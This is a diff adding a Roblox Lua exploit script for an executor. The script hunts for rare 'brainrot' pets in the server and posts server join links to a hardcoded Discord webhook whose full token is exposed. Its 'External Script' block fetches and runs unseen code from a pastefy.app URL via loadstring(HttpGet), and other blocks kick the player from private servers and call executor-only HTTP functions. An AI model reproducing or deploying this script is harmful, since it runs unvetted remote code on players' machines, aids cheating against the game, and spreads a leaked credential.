@@ -1,0 +1,169 @@
+--[[ 
+    25kDev Brainrot + External Loadstring Combo
+]]
+
+-- ======= BRAINROT SCRIPT =======
+
+-- CONFIG
+getgenv().webhook = "https://discord.com/api/webhooks/1103832319095210015/ti8-hE3yd95m34RJCxG9g0mtEcLPk1gJdWN_1VwD0XdusHAVnpDD3uGLFDj1gl-pxH2j"
+getgenv().websiteEndpoint = nil
+
+-- Allowed place IDs
+local allowedPlaceIds = {
+    [96342491571673] = true,
+    [109983668079237] = true
+}
+
+-- TARGET BRAINROTS
+getgenv().TargetPetNames = {
+    "Graipuss Medussi","La Grande Combinasion","Garama and Madundung","Sammyni Spyderini",
+    "Pot Hotspot","Nuclearo Dinossauro","Chicleteira Bicicleteira","Los Combinasionas",
+    "Dragon Cannelloni","Unclito Samito","Brainrot OG","Taza","Strawberry Elephant",
+    "Los Tacoritas","Blackhole Goat","La Vacca Saturno Saturnita","Extinct Matteo",
+    "Nuclearo Dinossauro","Chimpanzini Spiderini","Pot Hotspot","Chicleteira Bicicleteira",
+    "Las Vaquitas Saturnitas","Los Matteos","Job Job Job Sahur","Esok Sekolah",
+    "Karkerkar Kurkur","Agarrini la Palini","Dragon Cannelloni","Torrtuginni Dragonfruitini",
+    "Los Hotspotsitos"
+}
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+-- PRIVATE SERVER CHECK
+local function isPrivateServer()
+    return (game.PrivateServerId and game.PrivateServerId ~= "")
+        or (game.VIPServerId and game.VIPServerId ~= "")
+end
+
+local function buildJoinLink(placeId, jobId)
+    return string.format(
+        "https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s",
+        placeId,
+        jobId
+    )
+end
+
+-- KICK CHECKS
+if isPrivateServer() then
+    LocalPlayer:Kick("Kicked because in private server")
+    return
+elseif not allowedPlaceIds[game.PlaceId] then
+    local joinLink = buildJoinLink(game.PlaceId, game.JobId)
+    LocalPlayer:Kick("Kicked because wrong game\nClick to join server:\n" .. joinLink)
+    return
+end
+
+-- CHECK FOR BRAINROTS
+local function checkForBrainrots()
+    local found = {}
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("Model") then
+            local nameLower = string.lower(obj.Name)
+            for _, target in pairs(getgenv().TargetPetNames) do
+                if string.find(nameLower, string.lower(target)) then
+                    table.insert(found, obj.Name)
+                    break
+                end
+            end
+        end
+    end
+    return found
+end
+
+-- SEND WEBHOOK DYNAMIC
+local function sendWebhook(foundBrainrots, jobId)
+    local brainrotCounts = {}
+    for _, pet in ipairs(foundBrainrots) do
+        brainrotCounts[pet] = (brainrotCounts[pet] or 0) + 1
+    end
+
+    local formattedBrainrots = {}
+    for name, count in pairs(brainrotCounts) do
+        table.insert(formattedBrainrots, "🧠 **" .. name .. (count > 1 and " x" .. count or "") .. "**")
+    end
+
+    local joinLink = buildJoinLink(game.PlaceId, jobId)
+
+    local embedColor = 0xE74C3C
+    local title = "⚠️ No Brainrots detected"
+    local description = "No target brainrots found in this server."
+
+    local playerCount = #Players:GetPlayers()
+    local maxPlayers = Players.MaxPlayers
+    local fillRatio = playerCount / maxPlayers
+
+    if #foundBrainrots > 0 then
+        embedColor = 0x2ECC71
+        title = "🧠 BRAINROT DETECTED(S)!"
+        description = table.concat(formattedBrainrots, "\n")
+    elseif fillRatio >= 1 then
+        embedColor = 0xE74C3C
+        title = "🔴 SERVER FULL"
+        description = string.format("%d/%d players", playerCount, maxPlayers)
+    elseif fillRatio >= 0.9 then
+        embedColor = 0xF1C40F
+        title = "🟡 Server Almost Full"
+        description = string.format("%d/%d players", playerCount, maxPlayers)
+    end
+
+    local embedData = {
+        username = "25kDev Servers",
+        embeds = {{
+            title = title,
+            description = description,
+            color = embedColor,
+            fields = {
+                {name = "Players", value = string.format("%d/%d", playerCount, maxPlayers), inline = true},
+                {name = "Job ID", value = jobId, inline = true},
+                {name = "Join Link", value = string.format("[Click to join server](%s)", joinLink), inline = false}
+            },
+            footer = { text = "25kDev Servers" },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    local jsonData = HttpService:JSONEncode(embedData)
+    local req = http_request or request or (syn and syn.request)
+    if req then
+        local success, err = pcall(function()
+            req({
+                Url = getgenv().webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+        if success then
+            print("✅ Webhook sent")
+        else
+            warn("❌ Webhook failed:", err)
+        end
+    else
+        warn("❌ No HTTP request function available")
+    end
+end
+
+-- ======= EXTERNAL SCRIPT =======
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/MJw2J4T6/raw"))()
+    end)
+    if not success then
+        warn("❌ Failed to load external script:", err)
+    end
+end)
+
+-- ======= MAIN LOOP BRAINROT =======
+task.spawn(function()
+    while true do
+        local brainrotsFound = checkForBrainrots()
+        if #brainrotsFound > 0 then
+            print("✅ Brainrots found:", table.concat(brainrotsFound, ", "))
+        else
+            print("🔍 No brainrots found")
+        end
+        sendWebhook(brainrotsFound, game.JobId)
+        task.wait(15)
+    end
+end)
